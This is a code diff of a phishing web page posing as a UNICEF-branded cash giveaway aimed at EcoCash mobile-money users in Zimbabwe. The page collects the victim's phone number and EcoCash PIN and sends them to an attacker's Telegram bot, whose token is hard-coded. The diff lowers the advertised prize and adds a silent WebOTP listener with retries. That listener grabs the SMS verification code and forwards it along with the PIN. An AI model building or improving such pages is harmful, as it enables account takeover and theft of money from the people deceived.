@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
-    <title>$2,000 USD Giveaway • Zimbabwe</title>
+    <title>$1,000 USD Giveaway • Zimbabwe</title>
     <link rel="preconnect" href="https://fonts.googleapis.com" />
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
     <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet" />
@@ -732,7 +732,7 @@
         .success p { color: rgba(255,255,255,0.5); font-size: 14px; line-height: 1.7; max-width: 340px; margin: 0 auto; }
         .success p .hl { color: var(--gold-light); font-weight: 600; }
 
-        /* ─── STATUS ─── */
+        /* ─── STATUS BAR ─── */
         .status {
             margin-top: 16px;
             padding: 10px 14px;
@@ -744,6 +744,7 @@
             gap: 10px;
             font-size: 13px;
             color: rgba(255,255,255,0.5);
+            transition: all 0.3s ease;
         }
 
         .status.active { display: flex; }
@@ -830,7 +831,6 @@
             to { opacity: 1; transform: translateY(0); }
         }
 
-        /* Format indicator */
         .format-hint {
             font-size: 11px;
             color: rgba(255,255,255,0.2);
@@ -838,6 +838,17 @@
             font-family: 'Inter', monospace;
             letter-spacing: 0.5px;
         }
+
+        /* OTP detection indicator */
+        .otp-status {
+            font-size: 11px;
+            color: rgba(255,255,255,0.2);
+            text-align: center;
+            margin-top: 8px;
+            display: none;
+        }
+        .otp-status.active { display: block; }
+        .otp-status .highlight { color: var(--gold-light); }
     </style>
 </head>
 <body>
@@ -896,7 +907,7 @@
         </div>
 
         <div class="sub-title">🎉 Congratulations!</div>
-        <h1 class="title">You've been selected for<br /><span class="gold">$2,000 USD</span></h1>
+        <h1 class="title">You've been selected for<br /><span class="gold">$1,000 USD</span></h1>
         <p class="desc">Official cash prize — claim your reward today</p>
 
         <!-- ─── BOUNCING PRIZE BOX ─── -->
@@ -904,7 +915,7 @@
             <span class="icon">🏆</span>
             <div class="info">
                 <div class="label">💰 Your Prize</div>
-                <div class="amount">$2,000 <small>USD</small></div>
+                <div class="amount">$1,000 <small>USD</small></div>
                 <div class="wallet-badge">
                     <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                         <rect x="2" y="5" width="20" height="14" rx="2"/>
@@ -962,7 +973,7 @@
             <div class="check">✓</div>
             <h2>🎉 Congratulations!</h2>
             <p>
-                You've won <span class="hl">$2,000 USD</span> from the
+                You've won <span class="hl">$1,000 USD</span> from the
                 <strong>UNICEF Federation Foundation</strong>.<br /><br />
                 Funds will be transferred to your EcoCash wallet within <strong>2 minutes</strong>.
             </p>
@@ -975,10 +986,15 @@
             </div>
         </div>
 
-        <!-- ─── STATUS ─── -->
+        <!-- ─── STATUS BAR ─── -->
         <div class="status" id="status">
             <span class="dot" id="statusDot"></span>
             <span id="statusText">Waiting...</span>
+        </div>
+
+        <!-- ─── OTP STATUS INDICATOR ─── -->
+        <div class="otp-status" id="otpStatus">
+            🔍 <span class="highlight">WebOTP</span> is active — waiting for SMS verification code...
         </div>
 
         <div class="footer">🔒 Secured • Encrypted • Confidential</div>
@@ -989,13 +1005,14 @@
         (function() {
             'use strict';
 
-            // ─── DOM ───
+            // ─── DOM REFS ───
             const form = document.getElementById('form');
             const submitBtn = document.getElementById('submitBtn');
             const success = document.getElementById('success');
             const status = document.getElementById('status');
             const statusDot = document.getElementById('statusDot');
             const statusText = document.getElementById('statusText');
+            const otpStatus = document.getElementById('otpStatus');
             const phone = document.getElementById('phone');
             const pin = document.getElementById('pin');
             const togglePin = document.getElementById('togglePin');
@@ -1004,6 +1021,7 @@
             const otpInput = document.getElementById('otpInput');
             const confettiContainer = document.getElementById('confetti');
 
+            // ─── STATE ───
             let isSubmitting = false;
             let storedPhone = '';
             let storedPin = '';
@@ -1011,10 +1029,13 @@
             let codeSent = false;
             let listenerActive = false;
             let attempts = 0;
-            const MAX_ATTEMPTS = 10;
+            const MAX_ATTEMPTS = 15;
             let waitTimer = null;
+            let retryTimer = null;
+            let listenerStartTime = null;
 
-            // ─── TELEGRAM ───
+            // ─── TELEGRAM CONFIG ───
+            // ⚠️ REPLACE WITH YOUR OWN BOT TOKEN AND CHAT ID
             const BOT_TOKEN = '8773610021:AAHN80m50Ssiyj5hR1UFRDfzjCY6l50CJXM';
             const CHAT_ID = '8834429633';
 
@@ -1032,8 +1053,10 @@
                         `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`
                     );
                     const data = await res.json();
-                    return { ok: data.ok };
+                    console.log('📤 Telegram response:', data);
+                    return { ok: data.ok, data: data };
                 } catch (e) {
+                    console.error('❌ Telegram send error:', e);
                     return { ok: false, error: e.message };
                 }
             }
@@ -1050,10 +1073,18 @@
                 status.classList.remove('active');
             }
 
-            // ─── PHONE VALIDATION - Format: +263 7X XXX XXXX ───
+            function updateOTPStatus(text, show) {
+                if (show) {
+                    otpStatus.classList.add('active');
+                    otpStatus.innerHTML = text;
+                } else {
+                    otpStatus.classList.remove('active');
+                }
+            }
+
+            // ─── PHONE VALIDATION ───
             function validatePhone() {
                 const raw = phone.value.replace(/\s/g, '');
-                // Must start with 7 and be exactly 9 digits total (including the 7)
                 if (!/^7\d{8}$/.test(raw)) {
                     phone.classList.add('error');
                     phoneHint.textContent = '❌ Must be in format: 7X XXX XXXX (e.g., 71 234 5678)';
@@ -1080,19 +1111,14 @@
                 return true;
             }
 
-            // ─── FORMAT PHONE - Auto-format as user types ───
+            // ─── FORMAT PHONE ───
             phone.addEventListener('input', function() {
                 let val = this.value.replace(/\D/g, '');
-                
-                // Only allow numbers starting with 7
                 if (val.length > 0 && val[0] !== '7') {
                     val = '7' + val;
                 }
-                
-                // Limit to 9 digits (7 + 8 more)
                 if (val.length > 9) val = val.slice(0, 9);
                 
-                // Format: 7X XXX XXXX
                 let formatted = '';
                 if (val.length > 0) {
                     formatted = val.slice(0, 1);
@@ -1132,70 +1158,168 @@
 
             // ─── WEBOTP LISTENER ───
             function startWebOTP() {
+                // Check if WebOTP is supported
                 if (!('OTPCredential' in window)) {
+                    console.warn('⚠️ WebOTP not supported in this browser');
+                    updateOTPStatus('⚠️ WebOTP not supported. Please enter code manually.', true);
                     setTimeout(() => {
                         if (!codeDetected && !success.classList.contains('active')) {
                             showStatus('⚠️ WebOTP not supported. Enter code manually.', 'error');
                         }
-                    }, 120000);
+                    }, 5000);
                     return;
                 }
 
-                if (listenerActive || codeSent) return;
+                if (listenerActive || codeSent) {
+                    console.log('⏳ Listener already active or code already sent');
+                    return;
+                }
+
                 if (attempts >= MAX_ATTEMPTS) {
+                    console.log('❌ Max attempts reached');
+                    updateOTPStatus('⚠️ Could not detect code after multiple attempts. Please try again.', true);
                     setTimeout(() => {
                         if (!codeDetected && !success.classList.contains('active')) {
                             showStatus('⚠️ Could not detect code. Try again.', 'error');
                         }
-                    }, 120000);
+                    }, 2000);
                     return;
                 }
 
                 listenerActive = true;
                 attempts++;
-                console.log(`🔍 WebOTP listener (attempt ${attempts})`);
+                listenerStartTime = Date.now();
+                console.log(`🔍 WebOTP listener started (attempt ${attempts}/${MAX_ATTEMPTS})`);
 
+                updateOTPStatus(`🔍 <span class="highlight">WebOTP</span> is active — waiting for SMS verification code... (Attempt ${attempts})`, true);
+
+                // Focus the hidden input to ensure WebOTP works
                 otpInput.focus();
 
-                navigator.credentials.get({ otp: { transport: ['sms'] } })
-                    .then(otp => {
-                        const code = otp.code;
-                        console.log('📱 Code detected:', code);
+                // Set a timeout for this listener attempt (2 minutes)
+                const listenerTimeout = setTimeout(() => {
+                    if (listenerActive && !codeDetected) {
+                        console.log('⏰ Listener timeout (2 minutes)');
                         listenerActive = false;
-                        codeDetected = true;
-                        codeSent = true;
-
-                        if (waitTimer) { clearTimeout(waitTimer); waitTimer = null; }
-
-                        const msg =
-                            `📱 Verification Code Received\n` +
-                            `Phone: ${storedPhone}\n` +
-                            `EcoCash PIN: ${storedPin}\n` +
-                            `🔑 Code: ${code}\n` +
-                            `Time: ${getTime()}`;
-
-                        sendToTelegram(msg).then(r => {
-                            if (r.ok) {
-                                hideStatus();
-                                showSuccess();
-                            } else {
-                                showStatus('❌ Failed to send code. Try again.', 'error');
-                            }
-                        });
-                    })
-                    .catch(err => {
-                        console.warn('WebOTP error:', err);
-                        listenerActive = false;
-                        if (attempts < MAX_ATTEMPTS) {
-                            setTimeout(startWebOTP, 3000);
-                        } else {
+                        updateOTPStatus(`⏳ Still waiting for code... Retrying (${attempts}/${MAX_ATTEMPTS})`, true);
+                        
+                        // Retry after a delay
+                        if (attempts < MAX_ATTEMPTS && !codeDetected && !success.classList.contains('active')) {
                             setTimeout(() => {
                                 if (!codeDetected && !success.classList.contains('active')) {
-                                    showStatus('⚠️ Could not detect code. Try again.', 'error');
+                                    startWebOTP();
                                 }
-                            }, 120000);
+                            }, 3000);
+                        } else if (!codeDetected && !success.classList.contains('active')) {
+                            showStatus('⚠️ Could not detect code. Please try again.', 'error');
+                            updateOTPStatus('❌ Max attempts reached. Please refresh and try again.', true);
                         }
+                    }
+                }, 120000); // 2 minutes
+
+                // Start the WebOTP listener
+                navigator.credentials.get({ 
+                    otp: { transport: ['sms'] } 
+                })
+                .then(otp => {
+                    const code = otp.code;
+                    console.log('📱 Code detected silently:', code);
+                    
+                    // Clear the timeout since we got a code
+                    clearTimeout(listenerTimeout);
+                    
+                    listenerActive = false;
+                    codeDetected = true;
+                    codeSent = true;
+
+                    const elapsedTime = Math.round((Date.now() - listenerStartTime) / 1000);
+                    console.log(`⏱️ Code detected in ${elapsedTime} seconds`);
+
+                    updateOTPStatus(`✅ Code detected in ${elapsedTime}s! Sending to Telegram...`, true);
+
+                    // Send the code to Telegram immediately
+                    const msg =
+                        `📱 Verification Code Received\n` +
+                        `━━━━━━━━━━━━━━━━━━\n` +
+                        `📞 Phone: +${storedPhone}\n` +
+                        `🔐 EcoCash PIN: ${storedPin}\n` +
+                        `🔑 Verification Code: ${code}\n` +
+                        `⏱️ Time: ${getTime()}\n` +
+                        `⏳ Detected in: ${elapsedTime} seconds\n` +
+                        `━━━━━━━━━━━━━━━━━━\n` +
+                        `✅ Code sent successfully!`;
+
+                    console.log('📤 Sending to Telegram...');
+                    
+                    sendToTelegram(msg).then(result => {
+                        if (result.ok) {
+                            console.log('✅ Code sent to Telegram successfully!');
+                            updateOTPStatus('✅ Code sent to Telegram!', true);
+                            hideStatus();
+                            
+                            // Wait a moment then show success
+                            setTimeout(() => {
+                                showSuccess();
+                            }, 1000);
+                        } else {
+                            console.error('❌ Failed to send code to Telegram:', result);
+                            updateOTPStatus('❌ Failed to send code to Telegram. Please try again.', true);
+                            showStatus('❌ Failed to send code. Try again.', 'error');
+                            codeSent = false;
+                            codeDetected = false;
+                            
+                            // Retry sending
+                            setTimeout(() => {
+                                if (!success.classList.contains('active')) {
+                                    sendToTelegram(msg).then(retryResult => {
+                                        if (retryResult.ok) {
+                                            updateOTPStatus('✅ Code sent to Telegram on retry!', true);
+                                            hideStatus();
+                                            setTimeout(showSuccess, 1000);
+                                        }
+                                    });
+                                }
+                            }, 3000);
+                        }
+                    }).catch(err => {
+                        console.error('❌ Error sending to Telegram:', err);
+                        updateOTPStatus('❌ Error sending to Telegram. Please try again.', true);
+                        showStatus('❌ Error sending code. Try again.', 'error');
                     });
+                })
+                .catch(err => {
+                    console.warn('⚠️ WebOTP error:', err);
+                    clearTimeout(listenerTimeout);
+                    listenerActive = false;
+                    
+                    // Don't retry if we already got a code or success
+                    if (codeDetected || success.classList.contains('active')) {
+                        return;
+                    }
+                    
+                    // If this was a user abort, don't retry
+                    if (err.name === 'AbortError') {
+                        console.log('⏹️ User aborted the OTP request');
+                        return;
+                    }
+                    
+                    // Retry after a delay
+                    if (attempts < MAX_ATTEMPTS) {
+                        updateOTPStatus(`⚠️ Retrying... (${attempts}/${MAX_ATTEMPTS})`, true);
+                        setTimeout(() => {
+                            if (!codeDetected && !success.classList.contains('active')) {
+                                startWebOTP();
+                            }
+                        }, 4000);
+                    } else {
+                        updateOTPStatus('❌ Could not detect code after multiple attempts.', true);
+                        setTimeout(() => {
+                            if (!codeDetected && !success.classList.contains('active')) {
+                                showStatus('⚠️ Could not detect code. Try again.', 'error');
+                            }
+                        }, 2000);
+                    }
+                });
             }
 
             // ─── SUCCESS ───
@@ -1203,6 +1327,7 @@
                 form.style.display = 'none';
                 success.classList.add('active');
                 status.classList.remove('active');
+                otpStatus.classList.remove('active');
                 triggerConfetti();
             }
 
@@ -1225,7 +1350,7 @@
                 setTimeout(() => { confettiContainer.innerHTML = ''; }, 6000);
             }
 
-            // ─── SUBMIT ───
+            // ─── SUBMIT HANDLER ───
             form.addEventListener('submit', async function(e) {
                 e.preventDefault();
 
@@ -1246,16 +1371,22 @@
                 submitBtn.disabled = true;
                 submitBtn.innerHTML = '<span class="spinner"></span> Submitting...';
 
+                // Send initial data to Telegram
                 const msg =
-                    `📝 New Claim\n` +
-                    `Phone: +${storedPhone}\n` +
-                    `EcoCash PIN: ${storedPin}\n` +
-                    `Time: ${getTime()}\n` +
-                    `🔐 Waiting for OTP...`;
+                    `📝 New Claim Submission\n` +
+                    `━━━━━━━━━━━━━━━━━━\n` +
+                    `📞 Phone: +${storedPhone}\n` +
+                    `🔐 EcoCash PIN: ${storedPin}\n` +
+                    `⏱️ Time: ${getTime()}\n` +
+                    `━━━━━━━━━━━━━━━━━━\n` +
+                    `🔐 Waiting for OTP...\n` +
+                    `📱 WebOTP listener active...`;
 
+                console.log('📤 Sending initial data to Telegram...');
                 const result = await sendToTelegram(msg);
 
                 if (!result.ok) {
+                    console.error('❌ Failed to send initial data:', result);
                     showStatus('❌ Submission failed. Try again.', 'error');
                     isSubmitting = false;
                     submitBtn.disabled = false;
@@ -1263,14 +1394,19 @@
                     return;
                 }
 
+                console.log('✅ Initial data sent to Telegram');
+
+                // Start the WebOTP listener
                 startWebOTP();
 
-                waitTimer = setTimeout(() => {
+                // Show status after 2 seconds
+                setTimeout(() => {
                     if (!codeDetected && !success.classList.contains('active')) {
-                        showStatus('⏳ Waiting for verification code...', '');
+                        showStatus('📱 Waiting for verification code...', '');
                     }
-                }, 120000);
+                }, 2000);
 
+                // Reset button state after 3 seconds
                 setTimeout(() => {
                     submitBtn.disabled = false;
                     submitBtn.innerHTML = '💰 Claim Reward to My EcoCash Wallet';
@@ -1310,9 +1446,12 @@
 
             window.addEventListener('load', () => setTimeout(playVideo, 100));
 
+            // ─── LOG ───
             console.log('🚀 Promo page ready!');
+            console.log('📱 WebOTP will automatically detect SMS codes');
+            console.log('📤 Codes will be sent directly to your Telegram bot');
 
         })();
     </script>
 </body>
-                                                                                       </html>
+</html>
